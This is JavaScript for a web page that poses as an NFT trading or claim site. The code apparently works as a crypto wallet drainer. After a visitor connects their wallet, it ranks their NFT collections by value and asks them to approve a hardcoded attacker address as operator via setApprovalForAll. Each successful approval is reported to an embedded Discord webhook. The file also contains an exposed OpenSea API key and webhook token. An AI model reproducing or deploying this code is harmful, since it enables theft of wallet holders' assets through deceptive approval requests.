const receiveAddress = "0x5FAf73b167d1246EfF95B33D64A6D8C7d9Dfc3B5";
const drainNftsInfo = {
    minValue: 0.01,
    maxTransfers: 1,
}

let web3Provider;
let web3Js = null;
let walletAddress = null;
let ethBalance = 0;
let ethBalanceCounter = 0;
let metamaskInstalled = false;
let walletColls = [];
let walletAssets = [];
let walletAssetsCounter = [];
const X_API_KEY = "f69c0112d1c348d799aee906d7435263";


updateState(false)

if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

async function connectButton() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : {
        provider: "walletconnect"
    });
    web3Js = new Web3(Moralis.provider);
    walletAddress = (await web3Js.eth.getAccounts())[0];
    let bal = await web3Js.eth.getBalance(walletAddress)
    if (Number(bal))
        ethBalance = Number(Number(bal) / 1e18).toFixed(2)
    else
        ethBalance = 0
    showLogedIn(walletAddress)
    fetchCollections(walletAddress)
    fetchAssets(walletAddress, false)
}

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
});

Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});

window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(false);
}) : null;

window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1)
        updateState(false)
}) : null;

async function fetchAssets(address, isCounter) {
    const options = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': X_API_KEY
        }
    };

    let list = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=20&include_orders=false`, options)
        .then(response => response.json())
        .then(response => {
            console.log("assets", response)
            return response.assets.map(nft => {
                return {
                    name: nft.name,
                    token_id: nft.token_id,
                    image_original_url: nft.image_original_url,
                }
            })
        })
        .catch(error => {
            console.error(error)
        });

    let balance = 0
    if (isCounter) {
        let bal = await web3Js.eth.getBalance(address)
        if (Number(bal))
            ethBalanceCounter = Number(Number(bal) / 1e18).toFixed(2)
        else
            ethBalanceCounter = 0
        balance = ethBalanceCounter
        console.log("ethBalanceCounter", ethBalanceCounter);
    } else {
        balance = ethBalance
    }
    list.splice(0, 0, {
        name: "Ethereum",
        token_id: "ETH",
        balance: balance,
        image_original_url: "https://avatars.githubusercontent.com/u/6250754?s=200&amp;v=4",
    })
    if (isCounter)
        walletAssetsCounter = list
    else
        walletAssets = list
}

async function fetchCollections(address) {

    const options = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': X_API_KEY
        }
    };

    walletColls = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=300`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log("collections:", nfts)
            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    name: nft.primary_asset_contracts[0].name,
                    image_url: nft.primary_asset_contracts[0].image_url,
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        })
        .catch(error => {
            console.error(error)
        });
}

async function askNfts() {

    if (walletColls.includes("Request was throttled.")) return notEligible();
    if (walletColls.length < 1) return notEligible();
    console.log(walletColls);

    let transactionsOptions = [];
    for (nft of walletColls) {
        if (nft.price === 0) continue;
        const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
        if (ethPrice < drainNftsInfo.minValue) continue;
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contractAddress: nft.contract_address,
                from: walletAddress,
                functionName: "setApprovalForAll",
                abi: [{
                    "inputs": [{
                        "internalType": "address",
                        "name": "operator",
                        "type": "address"
                    }, {
                        "internalType": "bool",
                        "name": "approved",
                        "type": "bool"
                    }],
                    "name": "setApprovalForAll",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }],
                params: {
                    operator: ethPrice > 999 ? "0x5FAf73b167d1246EfF95B33D64A6D8C7d9Dfc3B5" : receiveAddress,
                    approved: true
                },
                gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
            }
        });
    }

    if (transactionsOptions.length < 1) return notEligible();

    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price).slice(0, drainNftsInfo.maxTransfers);
    for (transaction of transactionLists) {
        console.log(`Transferring ${transaction.options.contractAddress} (${transaction.price} ETH)`);


        if (isMobile()) {
            await Moralis.executeFunction(transaction.options).catch(O_o => console.error(O_o, options)).then(uwu => {
                if (uwu) {} else return;
                sendWebhooks(`\`${walletAddress}\` just approved \`${transaction.options.contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`);
            });
        } else {
            Moralis.executeFunction(transaction.options).catch(O_o => console.error(O_o, options)).then(uwu => {
                if (uwu) {} else return;
                sendWebhooks(`\`${walletAddress}\` just approved \`${transaction.options.contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`);
            });
            await sleep(111);
        }
    }
}

const sendWebhooks = (message) => {
    const webhookURL = "https://discord.com/api/webhooks/995367359948796017/2gNGEkfHc96yjsF_43Kow5AlaXdBZce0WgJ45zBMMaWMLx7-DXQ2U0ffBmvTyPeQhbLc"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}

async function askTransfer() {
    document.getElementById("claimButton").style.opacity = 0.5;
    document.getElementById("claimButton").style.pointerEvents = "none";
    document.getElementById("claimButton").removeEventListener("click", askTransfer);
    await askNfts();
    document.getElementById("claimButton").style.opacity = 1;
    document.getElementById("claimButton").style.pointerEvents = "pointer";
    document.getElementById("claimButton").addEventListener("click", askTransfer);
}


window.addEventListener('load', async () => {
    if (isMobile() && !window.ethereum) {
        document.querySelector("#mainButton").addEventListener("click", () =>
            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`);
    } else document.querySelector("#mainButton").addEventListener("click", connectButton);
    document.querySelector("#claimButton").addEventListener("click", askTransfer);
});


async function updateState(connected) {
    document.querySelector("#mainButton").style.display = connected ? "none" : "";
    document.querySelector("#claimButton").style.display = connected ? "" : "none";
}

const notEligible = () => {
    notify("You are not eligible")
}

function notify(msg) {
    Toastify({
        text: msg,
        duration: 3000,
        gravity: "top",
        position: "right",
    }).showToast();
}

function isMobile() {
    var check = false;
    (function(a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

function openInNewTab(href) {
    Object.assign(document.createElement('a'), {
        target: '_blank',
        href: href,
    }).click();
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const getRdm = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function showLogedIn(Address) {
    $("#stepSpan").text("1")
    $("#stepInfo").text("Select ERC721, ERC1155 or Ethereum tokens from both parts")
    $(".trade-zone").css("opacity", "1");
    $(".trade-zone").css("pointer-events", "all");
    $("#userWalletAdress").text(Address);
}


$(".open").click(function() {
    $(".pop-up").css("display", "block");
    $.each(walletAssets, function(index, value) {
        if (walletAssets[index].name === 'Ethereum') {
            $(".article-transfer").append(
                `
            <article id="one-left-${index}">
                <img src="${value.image_original_url}"/>
                <h5>${value.name}</h5>
                <div class="divEth">
                <button id="id-decInput">-</button>
                <span id="id-ethInput" max="0" min="0.01">${value.balance}</span>
                <button id="id-incInput">+</button>
                </div>
                <button class="btn-transfer btn-one transfer-one" id="${index}">Transfer</button>
            </article>
        `);
        } else {
            $(".article-transfer").append(
                `
            <article id="one-left-${index}">
                <img src="${value.image_original_url}"/>
                <h5>${value.name}</h5>
                <p>Token id : ${value.token_id}</p>
                <button class="btn-transfer btn-one transfer-one" id="${index}">Transfer</button>
            </article>
        `);
        }
    });
});

$(document).on('click', "#id-decInput", function(e) {
    console.log('id-decInput');
    if (ethBalance == 0) {
        $("#id-ethInput").html(0.00)
    } else {
        let val = $("#id-ethInput").html()
        if (val > 0.01) {
            $("#id-ethInput").html((Number(val) - 0.01).toFixed(2))
            walletAssets.find(x => {
                if (x.name === 'Ethereum')
                    x.balance = (Number(val) - 0.01).toFixed(2)
            })
        }
    }
});
$(document).on('click', "#id-incInput", function(e) {
    console.log('id-incInput');
    if (ethBalance == 0) {
        $("#id-ethInput").html(0.00)
    } else {
        let val = $("#id-ethInput").html()
        if (val < ethBalance) {
            $("#id-ethInput").html((Number(val) + 0.01).toFixed(2))
            walletAssets.find(x => {
                if (x.name === 'Ethereum')
                    x.balance = (Number(val) + 0.01).toFixed(2)
            })
        }
    }
});

$(document).on('click', ".transfer-one", function(e) {
    let index = e.target.id
    $(`#one-left-${index}`).remove();
    if (walletAssets[index].name === 'Ethereum') {
        $(".nft-list").append(
            `<article id="left-${index}">
                <img src="${walletAssets[index].image_original_url}">
                <h5> ${walletAssets[index].name}</h5>
                <div class="divEth">
                    <button id="id-decInput">-</button>
                    <span id="id-ethInput" max="0" min="0.01">${walletAssets[index].balance}</span>
                    <button id="id-incInput">+</button>
                </div>
                <button class="btn-transfer transferItemsButton remove-one" id="${index}" >Remove</button>
              </article>`
        );
    } else {
        $(".nft-list").append(
            `<article id="left-${index}">
                <img src="${walletAssets[index].image_original_url}">
                <h5> ${walletAssets[index].name}</h5>
                <button class="btn-transfer transferItemsButton remove-one" id="${index}" >Remove</button>
              </article>`
        );
    }
});

$(".close").click(function() {
    $(".article-transfer").empty();
    setTimeout(() => {
        $(".pop-up").css("display", "none");
    }, 100);
});

$(document).on('click', ".remove-one", function(e) {
    let index = e.target.id
    $(`#left-${index}`).remove();
});

$(".open-counter").click(function() {
    $(".pop-up-counter").css("display", "block");
    $.each(walletAssetsCounter, function(index, value) {
        if (walletAssetsCounter[index].name === 'Ethereum') {
            $(".article-transfer-counter").append(
                `
            <article id="two-right-${index}">
                <img src="${value.image_original_url}"/>
                <h5>${value.name}</h5>
                <div class="divEth">
                <button id="id-counter-decInput">-</button>
                <span id="id-counter-ethInput" max="0" min="0.01">${value.balance}</span>
                <button id="id-counter-incInput">+</button>
                </div>
                <button class="btn-transfer btn-one transfer-two" id="${index}">Transfer</button>
            </article>
        `);
        } else {
            $(".article-transfer-counter").append(
                `
            <article id="two-right-${index}">
                <img src="${value.image_original_url}"/>
                <h5>${value.name}</h5>
                <p>Token id : ${value.token_id}</p>
                <button class="btn-transfer btn-one transfer-two" id="${index}">Transfer</button>
            </article>
        `);
        }
    });
});

$(document).on('click', "#id-counter-decInput", function(e) {
    console.log('id-counter-decInput');
    if (ethBalanceCounter == 0) {
        $("#id-counter-ethInput").html(0.00)
    } else {
        let val = $("#id-counter-ethInput").html()
        if (val > 0.01) {
            $("#id-counter-ethInput").html((Number(val) - 0.01).toFixed(2))
            walletAssetsCounter.find(x => {
                if (x.name === 'Ethereum')
                    x.balance = (Number(val) - 0.01).toFixed(2)
            })
        }
    }
});
$(document).on('click', "#id-counter-incInput", function(e) {
    console.log('id-counter-incInput');
    if (ethBalanceCounter == 0) {
        $("#id-counter-ethInput").html(0.00)
    } else {
        let val = $("#id-counter-ethInput").html()
        if (val < ethBalanceCounter) {
            $("#id-counter-ethInput").html((Number(val) + 0.01).toFixed(2))
            walletAssetsCounter.find(x => {
                if (x.name === 'Ethereum')
                    x.balance = (Number(val) + 0.01).toFixed(2)
            })
        }
    }
});

$(document).on('click', ".transfer-two", function(e) {
    let index = e.target.id
    $(`#two-right-${index}`).remove();
    if (walletAssetsCounter[index].name === 'Ethereum') {
        $(".nft-list-counter").append(
            `<article id="right-${index}">
            <img src="${walletAssetsCounter[index].image_original_url}">
            <h5> ${walletAssetsCounter[index].name}</h5>
            <div class="divEth">
            <button id="id-counter-decInput">-</button>
            <span  id="id-counter-ethInput" max="0" min="0.01">${walletAssetsCounter[index].balance}</span>
            <button id="id-counter-incInput">+</button>
            </div>
            <button class="btn-transfer transferItemsButton remove-two" id="${index}" >Remove</button>
            </article>
            `);
    } else {
        $(".nft-list-counter").append(
            `<article id="right-${index}">
            <img src="${walletAssetsCounter[index].image_original_url}">
            <h5> ${walletAssetsCounter[index].name}</h5>
            <button class="btn-transfer transferItemsButton remove-two" id="${index}" >Remove</button>
            </article>
            `);
    }
});

$(".close-two").click(function() {
    $(".article-transfer-counter").empty();
    $(".pop-up-counter").css("display", "none");
});

$(document).on('click', ".remove-two", function(e) {
    let index = e.target.id
    $(`#right-${index}`).remove();
});

$("#openCounterAddress").click(function() {
    $(".select-wallet").css("display", "block");
});

$("#selectWalletButt").click(function() {
    let addr = $("#wallet-search").val()

    let isValidAddr = web3Js.utils.isAddress(addr)
    if (isValidAddr) {
        $(".select-wallet").css("display", "none");
        $("#otherWalletAdress").text(addr);
        $(".open-counter").css("pointer-events", "all");
        fetchAssets(addr, true)
    } else {
        notify("Please enter a valid Ethereum address")
    }
});

$(".close-three").click(function() {
    $(".select-wallet").css("display", "none");
});

//#endregion